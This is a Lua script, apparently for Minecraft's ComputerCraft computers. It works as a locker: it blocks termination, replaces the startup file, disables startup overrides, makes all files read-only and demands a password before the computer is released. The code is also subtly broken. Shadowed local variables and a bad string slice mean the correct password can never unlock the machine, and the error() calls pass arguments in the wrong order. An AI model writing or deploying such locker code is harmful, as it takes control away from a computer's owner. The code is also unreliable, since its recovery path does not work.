--prevents termination
local oldPull = os.pullEvent
os.pullEvent = os.pullEventRaw

--preserves settings, then changes them
if fs.exists("/.settings") then
    fs.copy("/.settings", "/old/.settings")
end
if fs.exists("/startup") and (shell.resolve(shell.getRunningProgram()) ~= "startup") then
    --this file is not called startup
    fs.move("/startup", "/old/startup")
    fs.copy(shell.resolve(shell.getRunningProgram()), "startup")
end
settings.load("/.settings")
settings.set("shell.allow_disk_startup", false)
settings.set("shell.allow_startup", false)
settings.save("/.settings")

--makes all files read only
local oldReadOnly = fs.isReadOnly
isLocked = true
fs.isReadOnly = function(path)
    if not isLocked then
        return oldReadOnly(path)
    end
    return true
end

--prevents editing apis
local oldRawset = rawset
local oldGetMeta = getmetatable
local oldSetMeta = setmetatable
local fakeEnvMeta = {}
local env = nil
env = setmetatable({}, {
    __index = _G,
    __newindex = function(t, k, v)
        if _G[k] then
            error(2, "No Editing Globals")
        end
        oldRawset(t, k, v)
    end
})
rawset = function(t, k, v)
    if t == env then
        return getmetatable(t).__newindex(t, k, v)
    end
    return oldRawset(t, k, v)
end
getmetatable = function(t)
    if t == env then
        return fakeEnvMeta
    end
    return oldGetMeta(t)
end
setmetatable = function(t, meta)
    if t == env then
        error(2, "No Editing This Metatable")
    end
    return oldSetMeta(t, meta)
end

term.write("To Free Your Computer, Type My Password: ")
--Not as good as hashing (probably), but works
local pass = 127813050000000000000000000
local num1, num2
do
    --seperates "12345:678901" into "12345" and "678901"
    local txt = read("*")
    local sep = txt:find(":")
    if sep then
        local num1, num2 = tonumber(txt:sub(1, sep - 1)), tonumber(txt:sub(sep))
    end
end

if (num1 and num2) and ((num1 * num2) == pass) then
    print("Uninstalling...")
    isLocked = false
    fs.delete("/startup")
    fs.delete("/.settings")
    if fs.exists("/old/.settings") then
        fs.move("/old/.settings", ".settings")
    end
    if fs.exists("/old/startup") then
        fs.move("/old/startup", "startup")
    end
    if fs.exists("/old") then
        fs.delete("/old")
    end
    os.reboot()
end

print("Incorrect")

--loads shell with this enviornment
term.clear()
term.setCursorPos(1, 1)
loadfile("/rom/programs/shell", env)()
os.reboot()
